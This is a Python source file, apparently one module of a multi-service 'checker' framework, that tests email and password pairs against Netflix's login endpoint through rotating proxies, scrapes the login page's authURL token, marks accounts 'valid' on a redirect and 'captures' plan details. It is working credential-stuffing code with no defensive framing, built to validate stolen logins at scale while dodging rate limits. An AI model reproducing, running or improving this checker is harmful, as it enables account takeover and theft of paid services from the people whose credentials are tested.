import aiohttp
from bs4 import BeautifulSoup
import json
from typing import Dict
from .base_checker import BaseChecker

class NetflixChecker(BaseChecker):
    def get_name(self) -> str:
        return "netflix"
        
    async def check(self, email: str, password: str) -> Dict:
        result = {
            "service": "netflix",
            "email": email,
            "status": "invalid",
            "capture": None,
            "error": None
        }
        
        try:
            proxy = self._get_proxy()
            proxy_url = f"http://{proxy}" if proxy else None
            
            # Paso 1: Obtener cookies iniciales y auth URL
            async with self.session.get(
                "https://www.netflix.com/login",
                proxy=proxy_url
            ) as response:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                
                # Extraer auth URL y tokens
                auth_url = soup.find('input', {'name': 'authURL'})
                if not auth_url:
                    result["error"] = "No auth URL found"
                    return result
                    
            # Paso 2: Intentar login
            login_data = {
                'userLoginId': email,
                'password': password,
                'rememberMe': 'true',
                'flow': 'websiteSignUp',
                'mode': 'login',
                'authURL': auth_url.get('value', '')
            }
            
            async with self.session.post(
                "https://www.netflix.com/api/login",
                data=login_data,
                proxy=proxy_url,
                allow_redirects=False
            ) as response:
                
                if response.status == 302:
                    # Redirección exitosa - verificar cuenta
                    result["status"] = "valid"
                    
                    # Intentar obtener info de la cuenta
                    account_info = await self._get_account_info(proxy_url)
                    if account_info:
                        result["capture"] = json.dumps(account_info)
                        
                elif response.status == 401:
                    result["status"] = "invalid"
                else:
                    result["status"] = "error"
                    result["error"] = f"HTTP {response.status}"
                    
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
            
        return result
        
    async def _get_account_info(self, proxy_url: str) -> Dict:
        try:
            async with self.session.get(
                "https://www.netflix.com/YourAccount",
                proxy=proxy_url
            ) as response:
                if response.status == 200:
                    html = await response.text()
                    # Parsear info del plan, fecha de expiración, etc.
                    # Esto varía según la estructura HTML actual
                    return {
                        "plan": "unknown",
                        "screens": "unknown"
                    }
        except:
            pass
        return {}